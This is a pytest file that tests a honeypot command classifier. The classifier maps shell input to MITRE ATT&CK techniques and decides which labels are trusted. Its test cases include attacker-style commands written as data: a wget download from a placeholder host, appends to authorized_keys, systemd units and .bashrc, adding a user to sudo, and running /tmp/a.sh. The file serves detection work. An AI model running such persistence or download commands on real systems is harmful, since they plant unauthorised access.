from __future__ import annotations

from production.classification.classification_pipeline import NotebookParityClassifier
from production.classification.trust import is_trusted_classification_event
from production.workers.session_monitor import SessionMonitor


class _Mitre:
    @staticmethod
    def get_name(ttp: str) -> str:
        return ttp

    @staticmethod
    def get_tactics(ttp: str) -> list[str]:
        return {
            "T1033": ["discovery"],
            "T1053": ["execution"],
            "T1059": ["execution"],
            "T1098": ["persistence"],
            "T1105": ["command-and-control"],
            "T1496": ["impact"],
            "T1543": ["persistence"],
            "T1546": ["privilege-escalation"],
            "T1548": ["privilege-escalation"],
        }.get(ttp, ["discovery"])


def _classifier(*, bert_fn=None) -> NotebookParityClassifier:
    return NotebookParityClassifier(bert_fn=bert_fn, mitre_db=_Mitre())


def _event(command: str) -> dict:
    return {
        "eventid": "cowrie.command.input",
        "session": "phase1",
        "src_ip": "203.0.113.10",
        "timestamp": "2026-08-13T00:00:00Z",
        "input": command,
    }


def _trusted_ttps(command: str) -> list[str]:
    return [
        str(event.get("ttp"))
        for event in _classifier().classify(command)
        if is_trusted_classification_event(event)
    ]


def test_inert_text_and_search_mentions_are_audit_only() -> None:
    cases = {
        "echo whoami": "T1033",
        "printf 'wget http://example.invalid/x'": "T1105",
        "grep xmrig /var/log/app": "T1496",
        "echo crontab": "T1053",
        "grep NOPASSWD /etc/sudoers": "T1548",
    }
    for command, ttp in cases.items():
        events = _classifier().classify(command)
        matching = [event for event in events if event.get("ttp") == ttp]
        assert matching
        assert all(not is_trusted_classification_event(event) for event in matching)


def test_read_only_persistence_targets_cannot_satisfy_modification_rules() -> None:
    cases = {
        "cat /home/alice/.ssh/authorized_keys": "T1098",
        "cat /etc/systemd/system/demo.service": "T1543",
        "cat /root/.bashrc": "T1546",
    }
    for command, ttp in cases.items():
        events = _classifier().classify(command)
        matching = [event for event in events if event.get("ttp") == ttp]
        assert matching
        assert all(not is_trusted_classification_event(event) for event in matching)


def test_structurally_proven_destination_writes_remain_trusted() -> None:
    cases = {
        "echo key >> /home/alice/.ssh/authorized_keys": "T1098",
        "echo unit >> /etc/systemd/system/demo.service": "T1543",
        "echo hook >> /root/.bashrc": "T1546",
    }
    for command, ttp in cases.items():
        assert ttp in _trusted_ttps(command)


def test_direct_reviewed_invocations_remain_trusted() -> None:
    assert "T1033" in _trusted_ttps("whoami")
    assert "T1105" in _trusted_ttps("wget http://example.invalid/x")
    assert "T1098" in _trusted_ttps("usermod -aG sudo analyst")


def test_conditional_rhs_is_audit_only_and_absent_from_state_and_history() -> None:
    classifier = _classifier()
    for command in ("true || /tmp/a.sh", "false && /tmp/a.sh"):
        events = classifier.classify(command)
        rhs = [event for event in events if event.get("subcommand_index") == 1]
        assert rhs
        assert all(event.get("fragment_execution") == "conditional_unproven" for event in rhs)
        assert all(not is_trusted_classification_event(event) for event in rhs)

        monitor = SessionMonitor(
            mitre_db=_Mitre(),
            classification_fn=classifier.classify,
            classification_policy={"strategy": "notebook_merge"},
        )
        monitor.on_event(_event(command))
        state = monitor.get_session("phase1")
        assert state is not None
        assert "T1059" not in state.ttps
        assert all(
            "T1059" not in [label.get("technique") for label in phase.get("labels", [])]
            for phase in state.prediction_trusted_history
        )


def test_dynamic_or_unresolved_commands_remain_audit_only() -> None:
    for command in ("cat $TARGET", "cat /tmp/*", "$(printf whoami)"):
        assert _trusted_ttps(command) == []


def test_securebert_only_and_disagreement_remain_audit_only() -> None:
    model_only = _classifier(bert_fn=lambda _command: ("T1059", 0.99)).classify(
        "unknown-binary --flag"
    )
    assert model_only
    assert all(not is_trusted_classification_event(event) for event in model_only)

    disagreement = _classifier(bert_fn=lambda _command: ("T1059", 0.99)).classify(
        "whoami"
    )
    assert disagreement[0]["source"] == "rule_securebert_disagreement"
    assert not is_trusted_classification_event(disagreement[0])


def test_every_trusted_regex_has_reviewed_operation_context_metadata() -> None:
    classifier = _classifier()
    body = classifier.rule_policy["policy"]
    approved = set(body["runtime_authority"]["trusted_literal_fallback_rule_ids"])
    by_id = {
        str(metadata.get("rule_id")): metadata
        for metadata in classifier.rule_metadata.values()
    }
    assert approved
    for rule_id in approved:
        authority = by_id[rule_id]["runtime_authority"]
        assert authority["reviewed"] is True
        assert authority["promotion_class"] == "trusted_literal_fallback"
        assert authority["safety_class"] == "literal_unambiguous"
        assert authority["operation_class"] == "reviewed_operation_context"


def test_unloaded_or_unhashed_policy_cannot_create_trusted_candidate(tmp_path) -> None:
    classifier = NotebookParityClassifier(
        bert_fn=lambda _command: ("T1033", 0.99),
        mitre_db=_Mitre(),
        rule_policy_path=str(tmp_path / "missing.json"),
    )
    assert all(
        not is_trusted_classification_event(event)
        for event in classifier.classify("whoami")
    )
